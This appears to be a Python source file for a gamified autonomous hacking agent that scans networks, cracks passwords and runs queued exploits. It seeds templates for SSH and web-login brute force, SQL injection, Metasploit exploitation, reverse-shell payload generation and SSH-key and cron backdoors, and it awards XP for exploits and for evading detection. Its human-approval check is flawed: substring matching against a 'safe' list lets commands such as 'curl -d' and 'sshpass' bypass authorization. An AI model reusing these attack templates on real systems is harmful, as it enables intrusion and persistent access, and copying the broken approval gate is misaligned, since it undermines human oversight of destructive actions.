"""
Tamagotchi Engine — ELIOT Autonomous Agent

Mr. Robot-themed autonomous intelligence agent.
Runs in the background, discovers devices/vulns, prioritizes exploits,
manages cracking sessions (pausing Ollama for GPU), and creates
notifications requiring authorization for machine-access exploits.
"""

import asyncio
import json
import logging
import os
import signal
import subprocess
import time
import uuid
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


class TamaState(str, Enum):
    IDLE = "idle"
    SCANNING = "scanning"
    MAPPING = "mapping"
    CRACKING = "cracking"
    ANALYZING = "analyzing"
    EXPLOITING = "exploiting"
    ALERT = "alert"
    SLEEPING = "sleeping"


class NotificationType(str, Enum):
    NEW_DEVICE = "new_device"
    VULN_FOUND = "vuln_found"
    EXPLOIT_READY = "exploit_ready"
    CRACK_COMPLETE = "crack_complete"
    ACCESS_GAINED = "access_gained"
    ALERT = "alert"
    INFO = "info"


class AuthStatus(str, Enum):
    PENDING = "pending"
    APPROVED = "approved"
    DENIED = "denied"
    AUTO_APPROVED = "auto_approved"
    EXPIRED = "expired"


@dataclass
class Notification:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    type: NotificationType = NotificationType.INFO
    title: str = ""
    message: str = ""
    target: str = ""
    severity: str = "info"
    needs_auth: bool = False
    auth_status: AuthStatus = AuthStatus.AUTO_APPROVED
    created_at: float = field(default_factory=time.time)
    auth_at: Optional[float] = None
    result: Optional[str] = None
    exploit_cmd: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["type"] = self.type.value
        d["auth_status"] = self.auth_status.value
        return d


@dataclass
class CrackSession:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    tool: str = "john"
    target: str = ""
    hash_file: str = ""
    wordlist: str = "/usr/share/wordlists/rockyou.txt"
    status: str = "pending"
    progress: str = ""
    started_at: Optional[float] = None
    completed_at: Optional[float] = None
    result: Optional[str] = None
    pid: Optional[int] = None
    gpu_mode: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class ExploitTask:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    target: str = ""
    service: str = ""
    exploit_name: str = ""
    command: str = ""
    priority: int = 0  # Higher = more important
    cve: str = ""
    cvss: float = 0.0
    needs_auth: bool = True
    auth_status: AuthStatus = AuthStatus.PENDING
    created_at: float = field(default_factory=time.time)
    executed: bool = False
    result: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["auth_status"] = self.auth_status.value
        return d


class TamagotchiEngine:
    """
    Autonomous intelligence agent.
    Discovers, maps, prioritizes, and (with authorization) exploits.
    Gamified with XP, levels, weighted rewards, and learning from mistakes.
    """

    # Commands that need authorization (machine access / data extraction)
    AUTH_REQUIRED_PATTERNS = [
        "msfconsole", "msfvenom", "meterpreter",
        "hydra", "ncrack",
        "sqlmap --dump", "sqlmap --os-shell", "sqlmap --os-pwn",
        "exploit", "payload", "reverse_tcp",
        "john --show", "hashcat",
        "sshpass", "smbclient -L",
        "mount", "chroot",
        "curl -d", "wget --post",
        "airodump-ng", "aireplay-ng", "aireplay",
        "mdk4", "reaver", "bully", "pixiewps",
    ]

    # Commands that are always safe (no auth needed)
    SAFE_PATTERNS = [
        "nmap", "nikto", "whatweb", "gobuster", "dirb", "dirbuster",
        "enum4linux", "smbclient -N", "snmpwalk",
        "curl", "wget", "httpie",
        "arp", "ip ", "ifconfig", "ss", "netstat",
        "hcitool", "bluetoothctl",
        "nmcli", "iwlist", "iw ",
        "searchsploit",
        "cat ", "ls ", "grep ", "find ", "head ", "tail ",
        "airodump-ng --write", "tshark", "tcpdump",
        "macchanger",
    ]

    # ── Gamification Constants ───────────────────────────────
    XP_WEIGHTS = {
        "scan_complete": 10,
        "device_discovered": 15,
        "service_detected": 20,
        "vuln_found": 30,
        "exploit_success": 50,
        "crack_complete": 40,
        "auth_granted": 5,
        "knowledge_logged": 8,
        "new_network_mapped": 25,
        "wifi_ap_found": 12,
        "bluetooth_found": 10,
        "false_positive": -15,
        "scan_timeout": -5,
        "exploit_failed": -20,
        "wrong_classification": -10,
    }

    LEVEL_XP = [
        0, 100, 250, 500, 800, 1200, 1800, 2500, 3500, 5000,
        7000, 10000, 14000, 19000, 25000, 32000, 40000, 50000,
        62000, 75000, 90000, 110000, 135000, 165000, 200000,
    ]

    LEVEL_NAMES = [
        "Script Kiddie", "Script Kiddie", "Script Kiddie",
        "Novice Hacker", "Novice Hacker",
        "Junior Pentester", "Junior Pentester",
        "Pentester", "Pentester", "Pentester",
        "Senior Pentester", "Senior Pentester",
        "Security Analyst", "Security Analyst",
        "Red Team Operator", "Red Team Operator",
        "Exploit Developer", "Exploit Developer",
        "Security Researcher", "Security Researcher",
        "Bug Hunter", "Bug Hunter",
        "Elite Hacker", "Elite Hacker", "Elite Hacker",
    ]

    ACHIEVEMENTS = {
        "first_scan": {"name": "First Steps", "desc": "Complete your first scan", "xp": 50, "icon": "🔍"},
        "first_device": {"name": "Network Explorer", "desc": "Discover your first device", "xp": 75, "icon": "📡"},
        "first_vuln": {"name": "Bug Finder", "desc": "Find your first vulnerability", "xp": 100, "icon": "🐛"},
        "first_exploit": {"name": "Exploit Artist", "desc": "Execute your first exploit", "xp": 200, "icon": "💥"},
        "first_crack": {"name": "Password Hunter", "desc": "Complete your first crack session", "xp": 150, "icon": "🔐"},
        "ten_devices": {"name": "Network Mapper", "desc": "Discover 10 devices", "xp": 300, "icon": "🗺️"},
        "ten_vulns": {"name": "Vuln Collector", "desc": "Find 10 vulnerabilities", "xp": 400, "icon": "📋"},
        "hundred_xp": {"name": "Rising Star", "desc": "Earn 100 XP total", "xp": 50, "icon": "⭐"},
        "thousand_xp": {"name": "Dedicated Hacker", "desc": "Earn 1000 XP total", "xp": 100, "icon": "🌟"},
        "level_5": {"name": "Getting Serious", "desc": "Reach level 5", "xp": 200, "icon": "📈"},
        "level_10": {"name": "Pro Pentester", "desc": "Reach level 10", "xp": 500, "icon": "🏆"},
        "night_owl": {"name": "Night Owl", "desc": "Run a scan between 2-5 AM", "xp": 75, "icon": "🦉"},
        "full_network": {"name": "Network Dominator", "desc": "Map an entire /24 subnet", "xp": 600, "icon": "🌐"},
        "stealth_master": {"name": "Ghost", "desc": "Complete 10 scans without detection", "xp": 300, "icon": "👻"},
    }

    def __init__(self):
        self._state = TamaState.IDLE
        self._notifications: List[Notification] = []
        self._exploit_queue: List[ExploitTask] = []
        self._crack_sessions: List[CrackSession] = []
        self._knowledge_log: List[Dict[str, Any]] = []
        self._running = False
        self._paused = False
        self._loop_task: Optional[asyncio.Task] = None
        self._scan_task: Optional[asyncio.Task] = None
        self._ollama_pid: Optional[int] = None
        self._ollama_was_running = False
        self._stats = {
            "scans_run": 0,
            "devices_found": 0,
            "vulns_found": 0,
            "exploits_executed": 0,
            "cracks_run": 0,
            "notifications_created": 0,
            "authorizations_granted": 0,
            "handshakes_captured": 0,
            "networks_analyzed": 0,
            "open_networks_found": 0,
            "access_gained": 0,
        }
        # ── Gamification State ──
        self._xp: int = 0
        self._level: int = 1
        self._total_xp: int = 0
        self._achievements: List[str] = []
        self._event_log: List[Dict[str, Any]] = []
        self._streaks: Dict[str, int] = {
            "scans": 0, "devices": 0, "vulns": 0, "exploits": 0,
        }
        self._mistakes: List[Dict[str, Any]] = []
        self._current_thought: str = "Initializing..."
        self._thinking_log: List[Dict[str, Any]] = []
        # ── Phase tracking for user's route ──
        self._current_phase: str = "init"
        self._phase_progress: Dict[str, Any] = {}
        self._network_queue: List[Dict[str, Any]] = []
        self._target_queue: List[Dict[str, Any]] = []
        self._reports: List[Dict[str, Any]] = []
        # Persistence
        self._data_dir = Path("/home/jetson/El1ot/data/tamagotchi")
        self._data_dir.mkdir(parents=True, exist_ok=True)
        self._load_state()
        self._seed_knowledge()

    def _load_state(self):
        """Load persisted state from disk."""
        state_file = self._data_dir / "state.json"
        if not state_file.exists():
            return
        try:
            with open(state_file, 'r') as f:
                data = json.load(f)
            self._xp = data.get("xp", 0)
            self._level = data.get("level", 1)
            self._total_xp = data.get("total_xp", 0)
            self._achievements = data.get("achievements", [])
            self._streaks = data.get("streaks", {"scans": 0, "devices": 0, "vulns": 0, "exploits": 0})
            self._stats = data.get("stats", self._stats)
            logger.info(f"Loaded state: level={self._level}, xp={self._total_xp}, achievements={len(self._achievements)}")
        except Exception as e:
            logger.error(f"Failed to load state: {e}")

        # Load knowledge
        knowledge_file = self._data_dir / "knowledge.json"
        if knowledge_file.exists():
            try:
                with open(knowledge_file, 'r') as f:
                    self._knowledge_log = json.load(f)
                logger.info(f"Loaded {len(self._knowledge_log)} knowledge entries")
            except Exception as e:
                logger.error(f"Failed to load knowledge: {e}")

        # Load event log
        events_file = self._data_dir / "events.json"
        if events_file.exists():
            try:
                with open(events_file, 'r') as f:
                    self._event_log = json.load(f)
                logger.info(f"Loaded {len(self._event_log)} events")
            except Exception as e:
                logger.error(f"Failed to load events: {e}")

        # Load mistakes
        mistakes_file = self._data_dir / "mistakes.json"
        if mistakes_file.exists():
            try:
                with open(mistakes_file, 'r') as f:
                    self._mistakes = json.load(f)
                logger.info(f"Loaded {len(self._mistakes)} mistakes")
            except Exception as e:
                logger.error(f"Failed to load mistakes: {e}")

    def _seed_knowledge(self):
        """Seed knowledge base with known attack patterns and techniques."""
        if any(e["category"] == "attack_pattern" for e in self._knowledge_log):
            return  # Already seeded

        seed_data = [
            # ── Scan & Recon Combinations ──
            ("attack_pattern", "recon_combo", {
                "name": "Network Reconnaissance Chain",
                "steps": ["nmap -sn (host discovery)", "nmap -sV -sC (service detection)", "nmap -O (OS detection)", "nmap --script vuln (vulnerability scan)"],
                "description": "Progressive scanning from broad to targeted. Start with ping sweep, then service detection on live hosts, then targeted vuln scans.",
                "tools": ["nmap", "masscan"],
                "priority": "high",
            }, "mitre"),

            ("attack_pattern", "wifi_recon", {
                "name": "WiFi Reconnaissance",
                "steps": ["airodump-ng (capture)", "airodump-ng --bssid (target)", "aireplay-ng -4 (deauth for handshake)", "aircrack-ng (crack)"],
                "description": "Capture WiFi handshakes for password cracking. Requires monitor mode.",
                "tools": ["airodump-ng", "aireplay-ng", "aircrack-ng"],
                "requires_auth": True,
            }, "mitre"),

            ("attack_pattern", "bluetooth_recon", {
                "name": "Bluetooth Reconnaissance",
                "steps": ["hcitool scan", "hcitool inq", "sdptool browse", "bluetoothctl"],
                "description": "Discover Bluetooth devices and enumerate services.",
                "tools": ["hcitool", "sdptool", "bluetoothctl"],
            }, "mitre"),

            # ── Exploitation Patterns ──
            ("attack_pattern", "ssh_bruteforce", {
                "name": "SSH Brute Force",
                "command": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target}",
                "description": "Brute force SSH credentials with common password list.",
                "tools": ["hydra"],
                "requires_auth": True,
                "risk": "high",
            }, "mitre"),

            ("attack_pattern", "ftp_anon_exploit", {
                "name": "FTP Anonymous Access",
                "command": "nmap --script ftp-anon {target}",
                "description": "Check for anonymous FTP login and list accessible files.",
                "tools": ["nmap", "ftp"],
                "requires_auth": False,
            }, "mitre"),

            ("attack_pattern", "smb_enum", {
                "name": "SMB Enumeration",
                "command": "enum4linux -a {target}",
                "description": "Enumerate SMB shares, users, and policies.",
                "tools": ["enum4linux", "smbclient"],
                "requires_auth": False,
            }, "mitre"),

            ("attack_pattern", "web_vuln_scan", {
                "name": "Web Vulnerability Scan",
                "command": "nikto -h {target}",
                "description": "Scan web servers for common vulnerabilities, misconfigs, and outdated software.",
                "tools": ["nikto", "whatweb", "gobuster"],
                "requires_auth": False,
            }, "owasp"),

            ("attack_pattern", "sql_injection", {
                "name": "SQL Injection",
                "command": "sqlmap -u {url} --dbs --batch",
                "description": "Automated SQL injection testing and database enumeration.",
                "tools": ["sqlmap"],
                "requires_auth": True,
                "risk": "critical",
            }, "owasp"),

            ("attack_pattern", "msf_exploit", {
                "name": "Metasploit Exploitation",
                "command": "msfconsole -x 'use {exploit}; set RHOSTS {target}; exploit'",
                "description": "Use Metasploit framework for targeted exploitation.",
                "tools": ["msfconsole", "msfvenom"],
                "requires_auth": True,
                "risk": "critical",
            }, "mitre"),

            # ── Backdoor Techniques ──
            ("attack_pattern", "reverse_shell", {
                "name": "Reverse Shell",
                "command": "msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw",
                "description": "Generate reverse shell payload for initial access.",
                "tools": ["msfvenom", "ncat"],
                "requires_auth": True,
                "risk": "critical",
            }, "mitre"),

            ("attack_pattern", "ssh_backdoor", {
                "name": "SSH Key Backdoor",
                "description": "Add attacker SSH key to authorized_keys for persistent access.",
                "requires_auth": True,
                "risk": "high",
            }, "mitre"),

            ("attack_pattern", "cron_backdoor", {
                "name": "Cron Job Backdoor",
                "description": "Add persistent cron job for reverse shell or C2 beacon.",
                "requires_auth": True,
                "risk": "high",
            }, "mitre"),

            # ── Password Attacks ──
            ("attack_pattern", "hash_crack", {
                "name": "Password Hash Cracking",
                "command": "john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}",
                "description": "Crack password hashes using dictionary attack.",
                "tools": ["john", "hashcat"],
                "gpu_accelerated": True,
            }, "mitre"),

            ("attack_pattern", "hydra_web", {
                "name": "Web Login Brute Force",
                "command": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form '{path}:user=^USER^&pass=^PASS^:F=failed'",
                "description": "Brute force web login forms.",
                "tools": ["hydra"],
                "requires_auth": True,
            }, "mitre"),

            # ── Known CVEs ──
            ("cve_pattern", "eternalblue_ms17_010", {
                "name": "EternalBlue (MS17-010)",
                "cve": "CVE-2017-0144",
                "target": "SMB (445)",
                "affected": "Windows 7, Server 2008 R2",
                "exploit": "ms17_010_eternalblue",
                "severity": "critical",
                "description": "Remote code execution via SMBv1. Allows full system compromise.",
            }, "mitre"),

            ("cve_pattern", "bluekeep_cve_2019_0708", {
                "name": "BlueKeep (CVE-2019-0708)",
                "cve": "CVE-2019-0708",
                "target": "RDP (3389)",
                "affected": "Windows 7, Server 2008",
                "severity": "critical",
                "description": "Remote code execution in RDP. Wormable.",
            }, "mitre"),

            ("cve_pattern", "redis_unauth", {
                "name": "Redis Unauthorized Access",
                "cve": "N/A (misconfiguration)",
                "target": "Redis (6379)",
                "description": "Redis without auth allows arbitrary command execution, including writing SSH keys.",
                "severity": "high",
                "exploit": "redis-cli -h {target} INFO",
            }, "mitre"),

            ("cve_pattern", "telnet_creds", {
                "name": "Telnet Credential Exposure",
                "cve": "N/A (protocol flaw)",
                "target": "Telnet (23)",
                "description": "Telnet transmits credentials in plaintext. Sniffable on network.",
                "severity": "high",
            }, "mitre"),

            # ── Scan Profiles ──
            ("scan_profile", "quick_discovery", {
                "name": "Quick Network Discovery",
                "command": "nmap -sn -T3 --max-rate 2000 {target}",
                "description": "Fast ping sweep to find live hosts.",
                "duration": "30-60s",
            }, "internal"),

            ("scan_profile", "service_enumeration", {
                "name": "Service Enumeration",
                "command": "nmap -sV -sC --version-intensity 3 -T3 {target}",
                "description": "Detect services and versions with default scripts.",
                "duration": "2-5min per host",
            }, "internal"),

            ("scan_profile", "vuln_deep", {
                "name": "Deep Vulnerability Scan",
                "command": "nmap --script vuln -sV -T2 --max-rate 500 {target}",
                "description": "Thorough vulnerability scan with NSE scripts.",
                "duration": "10-30min per host",
            }, "internal"),

            ("scan_profile", "web_deep", {
                "name": "Web Application Scan",
                "command": "nikto -h {target} && gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt",
                "description": "Full web app scan: Nikto for vulns, Gobuster for hidden dirs.",
                "duration": "5-15min",
            }, "internal"),
        ]

        for category, key, value, source in seed_data:
            self.log_knowledge(category, key, value, source=source)

        logger.info(f"Seeded {len(seed_data)} knowledge entries")
        self.save_state()

    def save_state(self):
        """Persist state to disk."""
        try:
            state_file = self._data_dir / "state.json"
            with open(state_file, 'w') as f:
                json.dump({
                    "xp": self._xp,
                    "level": self._level,
                    "total_xp": self._total_xp,
                    "achievements": self._achievements,
                    "streaks": self._streaks,
                    "stats": self._stats,
                }, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save state: {e}")

        try:
            knowledge_file = self._data_dir / "knowledge.json"
            with open(knowledge_file, 'w') as f:
                json.dump(self._knowledge_log[-5000:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save knowledge: {e}")

        try:
            events_file = self._data_dir / "events.json"
            with open(events_file, 'w') as f:
                json.dump(self._event_log[-1000:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save events: {e}")

        try:
            mistakes_file = self._data_dir / "mistakes.json"
            with open(mistakes_file, 'w') as f:
                json.dump(self._mistakes[-200:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save mistakes: {e}")

    @property
    def state(self) -> TamaState:
        return self._state

    def get_status(self) -> Dict[str, Any]:
        return {
            "state": self._state.value,
            "running": self._running,
            "paused": self._paused,
            "current_phase": self._current_phase,
            "phase_progress": self._phase_progress,
            "pending_notifications": sum(
                1 for n in self._notifications
                if n.needs_auth and n.auth_status == AuthStatus.PENDING
            ),
            "total_notifications": len(self._notifications),
            "pending_exploits": sum(
                1 for e in self._exploit_queue
                if e.auth_status == AuthStatus.PENDING
            ),
            "active_cracks": sum(
                1 for c in self._crack_sessions if c.status == "running"
            ),
            "stats": self._stats,
            "ollama_paused": self._ollama_was_running,
            "current_thought": self._current_thought,
            "thinking_log": self._thinking_log[-5:],
            # Gamification
            "xp": self._xp,
            "level": self._level,
            "level_name": self._get_level_name(),
            "total_xp": self._total_xp,
            "xp_to_next": self._xp_to_next_level(),
            "xp_progress": self._xp_progress(),
            "achievements": self._achievements,
            "achievements_total": len(self.ACHIEVEMENTS),
            "streaks": self._streaks,
            "mistakes_count": len(self._mistakes),
            "knowledge_stats": self.get_knowledge_stats(),
        }

    # ── Gamification Methods ─────────────────────────────────

    def award_xp(self, action: str, amount: int = 0, detail: str = "") -> int:
        """Award XP for an action. Returns actual XP gained (may differ with multipliers)."""
        base = amount or self.XP_WEIGHTS.get(action, 5)

        # Streak bonus: +10% per streak level (max +50%)
        streak_key = action.split("_")[0] if "_" in action else action
        streak = self._streaks.get(streak_key, 0)
        multiplier = 1.0 + min(streak * 0.1, 0.5)
        final_xp = int(base * multiplier)

        self._xp += final_xp
        self._total_xp += final_xp

        # Level up check
        old_level = self._level
        self._level = self._calculate_level()
        leveled_up = self._level > old_level

        # Log the event
        self._event_log.append({
            "type": "xp",
            "action": action,
            "xp": final_xp,
            "base": base,
            "multiplier": round(multiplier, 1),
            "total": self._total_xp,
            "level": self._level,
            "detail": detail,
            "timestamp": time.time(),
        })

        # Keep log manageable
        if len(self._event_log) > 1000:
            self._event_log = self._event_log[-1000:]

        # Check achievements
        self._check_achievements()

        if leveled_up:
            self._event_log.append({
                "type": "level_up",
                "level": self._level,
                "name": self._get_level_name(),
                "timestamp": time.time(),
            })

        logger.info(f"XP awarded: {final_xp} for {action} (total: {self._total_xp}, level: {self._level})")
        self.save_state()
        return final_xp

    def penalize(self, action: str, amount: int = 0, reason: str = ""):
        """Penalize for mistakes (false positives, failures, etc)."""
        base = amount or abs(self.XP_WEIGHTS.get(action, -5))
        penalty = min(base, self._xp)  # Never go below 0
        self._xp -= penalty

        self._mistakes.append({
            "action": action,
            "penalty": penalty,
            "reason": reason,
            "timestamp": time.time(),
        })

        # Keep mistakes log manageable
        if len(self._mistakes) > 200:
            self._mistakes = self._mistakes[-200:]

        self._event_log.append({
            "type": "penalty",
            "action": action,
            "xp": -penalty,
            "reason": reason,
            "timestamp": time.time(),
        })

        logger.info(f"XP penalty: -{penalty} for {action} (reason: {reason})")
        return penalty

    def record_mistake(self, action: str, expected: str, actual: str):
        """Record a classification/prediction mistake for learning."""
        self._mistakes.append({
            "action": action,
            "expected": expected,
            "actual": actual,
            "timestamp": time.time(),
            "learned": False,
        })
        self.penalize("wrong_classification", reason=f"Expected {expected}, got {actual}")

    def get_learning_data(self) -> Dict[str, Any]:
        """Get data about mistakes and learning progress."""
        unlearned = [m for m in self._mistakes if not m.get("learned")]
        return {
            "total_mistakes": len(self._mistakes),
            "unlearned": len(unlearned),
            "recent_mistakes": self._mistakes[-10:],
            "learning_rate": 1.0 - (len(unlearned) / max(len(self._mistakes), 1)),
            "categories": self._mistake_categories(),
        }

    def _mistake_categories(self) -> Dict[str, int]:
        """Count mistakes by category."""
        cats = {}
        for m in self._mistakes:
            cat = m.get("action", "unknown")
            cats[cat] = cats.get(cat, 0) + 1
        return cats

    def _calculate_level(self) -> int:
        """Calculate level from total XP."""
        level = 1
        for i, threshold in enumerate(self.LEVEL_XP):
            if self._total_xp >= threshold:
                level = i + 1
            else:
                break
        return min(level, len(self.LEVEL_XP))

    def _get_level_name(self) -> str:
        idx = min(self._level - 1, len(self.LEVEL_NAMES) - 1)
        return self.LEVEL_NAMES[idx]

    def _xp_to_next_level(self) -> int:
        if self._level >= len(self.LEVEL_XP):
            return 0
        return self.LEVEL_XP[self._level] - self._total_xp

    def _xp_progress(self) -> float:
        if self._level >= len(self.LEVEL_XP):
            return 1.0
        current = self.LEVEL_XP[self._level - 1] if self._level > 1 else 0
        nxt = self.LEVEL_XP[self._level]
        return (self._total_xp - current) / max(nxt - current, 1)

    def _check_achievements(self):
        """Check and award achievements."""
        new_achievements = []

        def try_achieve(key):
            if key not in self._achievements:
                ach = self.ACHIEVEMENTS[key]
                self._achievements.append(key)
                new_achievements.append(ach)
                self._event_log.append({
                    "type": "achievement",
                    "key": key,
                    "name": ach["name"],
                    "desc": ach["desc"],
                    "icon": ach["icon"],
                    "xp": ach["xp"],
                    "timestamp": time.time(),
                })

        if self._stats["scans_run"] >= 1:
            try_achieve("first_scan")
        if self._stats["devices_found"] >= 1:
            try_achieve("first_device")
        if self._stats["vulns_found"] >= 1:
            try_achieve("first_vuln")
        if self._stats["exploits_executed"] >= 1:
            try_achieve("first_exploit")
        if self._stats["cracks_run"] >= 1:
            try_achieve("first_crack")
        if self._stats["devices_found"] >= 10:
            try_achieve("ten_devices")
        if self._stats["vulns_found"] >= 10:
            try_achieve("ten_vulns")
        if self._total_xp >= 100:
            try_achieve("hundred_xp")
        if self._total_xp >= 1000:
            try_achieve("thousand_xp")
        if self._level >= 5:
            try_achieve("level_5")
        if self._level >= 10:
            try_achieve("level_10")

        hour = time.localtime().tm_hour
        if 2 <= hour <= 5 and self._stats["scans_run"] > 0:
            try_achieve("night_owl")

        for ach in new_achievements:
            self.award_xp("achievement_unlocked", ach["xp"], ach["name"])

    # ── Authorization Logic ───────────────────────────────────

    def needs_authorization(self, command: str) -> bool:
        """Check if a command requires user authorization."""
        cmd_lower = command.lower()

        # Always safe commands don't need auth
        for pattern in self.SAFE_PATTERNS:
            if pattern in cmd_lower:
                return False

        # Check if command matches auth-required patterns
        for pattern in self.AUTH_REQUIRED_PATTERNS:
            if pattern in cmd_lower:
                return True

        return False

    def _create_vuln_notification(self, ip: str, port: int, vuln_type: str, severity: str, message: str):
        """Create a vulnerability notification from analysis."""
        # Deduplicate: don't re-create same vuln for same ip:port
        for n in self._notifications:
            if n.target == f"{ip}:{port}" and n.type == NotificationType.VULN_FOUND:
                return
        self.create_notification(
            NotificationType.VULN_FOUND,
            f"{vuln_type.replace('_', ' ').title()}: {ip}:{port}",
            message,
            target=f"{ip}:{port}",
            severity=severity,
        )
        self._stats["vulns_found"] += 1
        self.award_xp("vuln_found", detail=f"{vuln_type} on {ip}:{port}")

    def create_notification(
        self,
        ntype: NotificationType,
        title: str,
        message: str,
        target: str = "",
        severity: str = "info",
        needs_auth: bool = False,
        exploit_cmd: Optional[str] = None,
    ) -> Notification:
        """Create a notification (and optionally an exploit task)."""
        notif = Notification(
            type=ntype,
            title=title,
            message=message,
            target=target,
            severity=severity,
            needs_auth=needs_auth,
            exploit_cmd=exploit_cmd,
        )
        if needs_auth:
            notif.auth_status = AuthStatus.PENDING

        self._notifications.append(notif)
        self._stats["notifications_created"] += 1

        if exploit_cmd:
            task = ExploitTask(
                target=target,
                command=exploit_cmd,
                needs_auth=needs_auth,
                auth_status=notif.auth_status,
            )
            self._exploit_queue.append(task)

        logger.info(f"Notification: [{ntype.value}] {title} (auth={needs_auth})")
        return notif

    def authorize_notification(self, notification_id: str) -> bool:
        """Authorize a pending notification/exploit."""
        for notif in self._notifications:
            if notif.id == notification_id and notif.needs_auth:
                notif.auth_status = AuthStatus.APPROVED
                notif.auth_at = time.time()
                self._stats["authorizations_granted"] += 1

                # Also approve linked exploit task
                for task in self._exploit_queue:
                    if task.command == notif.exploit_cmd:
                        task.auth_status = AuthStatus.APPROVED

                logger.info(f"Authorized: {notif.title}")
                return True
        return False

    def deny_notification(self, notification_id: str) -> bool:
        """Deny a pending notification."""
        for notif in self._notifications:
            if notif.id == notification_id and notif.needs_auth:
                notif.auth_status = AuthStatus.DENIED
                notif.auth_at = time.time()

                for task in self._exploit_queue:
                    if task.command == notif.exploit_cmd:
                        task.auth_status = AuthStatus.DENIED

                logger.info(f"Denied: {notif.title}")
                return True
        return False

    # ── Knowledge Growth ──────────────────────────────────────

    def log_knowledge(self, category: str, key: str, value: Any, source: str = ""):
        """Log a piece of knowledge for future reference."""
        entry = {
            "category": category,
            "key": key,
            "value": value,
            "source": source,
            "timestamp": time.time(),
        }
        self._knowledge_log.append(entry)

        # Keep knowledge log manageable
        if len(self._knowledge_log) > 5000:
            self._knowledge_log = self._knowledge_log[-5000:]

        # Persist every 10 new entries to avoid excessive I/O
        if len(self._knowledge_log) % 10 == 0:
            self.save_state()

    def get_knowledge(self, category: Optional[str] = None, limit: int = 50) -> List[Dict]:
        """Get knowledge entries, optionally filtered by category."""
        entries = self._knowledge_log
        if category:
            entries = [e for e in entries if e["category"] == category]
        return entries[-limit:]

    def get_knowledge_stats(self) -> Dict[str, int]:
        """Get knowledge stats by category."""
        stats = {}
        for entry in self._knowledge_log:
            cat = entry["category"]
            stats[cat] = stats.get(cat, 0) + 1
        return stats

    # ── Crack Management ──────────────────────────────────────

    async def _pause_ollama(self):
        """Pause Ollama to free GPU for hashcat."""
        try:
            result = subprocess.run(
                ["pgrep", "-f", "ollama"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                pids = result.stdout.strip().split("\n")
                for pid_str in pids:
                    if pid_str.strip():
                        pid = int(pid_str.strip())
                        os.kill(pid, signal.SIGSTOP)
                        self._ollama_pid = pid
                        self._ollama_was_running = True
                        logger.info(f"Paused Ollama (PID {pid}) for GPU cracking")
                        return True
        except Exception as e:
            logger.warning(f"Could not pause Ollama: {e}")
        return False

    async def _resume_ollama(self):
        """Resume Ollama after cracking."""
        if self._ollama_pid and self._ollama_was_running:
            try:
                os.kill(self._ollama_pid, signal.SIGCONT)
                logger.info(f"Resumed Ollama (PID {self._ollama_pid})")
            except Exception as e:
                logger.warning(f"Could not resume Ollama: {e}")
            self._ollama_pid = None
            self._ollama_was_running = False

    async def start_crack(self, hash_file: str, tool: str = "john", gpu: bool = False) -> CrackSession:
        """Start a cracking session."""
        session = CrackSession(
            tool=tool,
            hash_file=hash_file,
            gpu_mode=gpu,
            status="starting",
        )

        if gpu and tool == "hashcat":
            await self._pause_ollama()

        self._crack_sessions.append(session)
        self._stats["cracks_run"] += 1

        # Build command
        if tool == "john":
            cmd = f"john {hash_file}"
        elif tool == "hashcat":
            mode = "0"  # default hash mode
            cmd = f"hashcat -m {mode} {hash_file} /usr/share/wordlists/rockyou.txt"
        else:
            cmd = f"{tool} {hash_file}"

        session.status = "running"
        session.started_at = time.time()

        # Run in background
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            session.pid = proc.pid
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=3600)
            session.result = stdout.decode("utf-8", errors="replace")
            session.status = "completed"
            session.completed_at = time.time()
        except asyncio.TimeoutError:
            session.status = "timeout"
            session.result = "Cracking session timed out after 1 hour"
            try:
                if proc and proc.returncode is None:
                    proc.kill()
                    await proc.wait()
                    logger.info(f"Killed orphaned cracking process PID={session.pid}")
            except Exception:
                pass
        except Exception as e:
            session.status = "error"
            session.result = str(e)
        finally:
            if gpu:
                await self._resume_ollama()

        self.create_notification(
            NotificationType.CRACK_COMPLETE,
            "Cracking Complete",
            f"Tool: {tool}, Status: {session.status}",
            target=hash_file,
        )

        return session

    # ── Exploit Prioritization ────────────────────────────────

    def prioritize_exploits(self) -> List[ExploitTask]:
        """Sort exploit queue by priority and CVSS score."""
        pending = [
            t for t in self._exploit_queue
            if t.auth_status in (AuthStatus.PENDING, AuthStatus.APPROVED)
            and not t.executed
        ]
        pending.sort(key=lambda t: (-t.priority, -t.cvss))
        return pending

    async def execute_authorized_exploits(self, shell_agent):
        """Execute all authorized exploits."""
        for task in self.prioritize_exploits():
            if task.auth_status == AuthStatus.APPROVED:
                self._state = TamaState.EXPLOITING
                logger.info(f"Executing authorized exploit: {task.command}")

                from agents.base import AgentMessage
                msg = AgentMessage(
                    sender="tamagotchi",
                    receiver="Shell",
                    content=f"!{task.command}",
                    metadata={"tamagotchi_exploit": True, "task_id": task.id},
                )
                result = await shell_agent.handle(msg)
                task.executed = True
                task.result = result.content
                self._stats["exploits_executed"] += 1

                self.log_knowledge(
                    "exploit",
                    task.exploit_name or task.command[:100],
                    {"target": task.target, "result": result.content[:500]},
                    source="tamagotchi",
                )

    # ── Learning from Discoveries ──────────────────────────────

    def learn_from_device(self, device: Dict[str, Any]):
        """Extract and store knowledge from a discovered device."""
        ip = device.get("ip", "")
        services = device.get("services", [])

        for svc in services:
            name = svc.get("name", "")
            version = svc.get("version", "")

            if version:
